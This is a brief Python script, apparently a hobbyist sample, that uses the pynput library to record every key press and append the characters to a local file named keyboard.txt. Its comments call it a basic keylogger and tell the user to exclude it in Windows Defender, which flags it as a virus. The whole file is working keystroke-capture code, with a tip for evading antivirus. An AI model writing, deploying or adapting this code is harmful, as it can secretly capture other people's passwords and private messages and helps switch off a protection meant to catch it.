from pynput import keyboard
#need keyboard from pynput library




#key function

def key(input):
    print(str(input))
    with open("keyboard.txt",'a') as logKey:
        try:
            char = input.char
            logKey.write(char)
        except:
            print("Error with key char value")
    
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key)
    listener.start()
    input()

    # Windows Defender will mark this as a virus, if you need to run this for testing purposes, exclude this in Defender settings. 
    # This is a basic version of a keylogger that is designed to keep a log of text in the local storage. 
    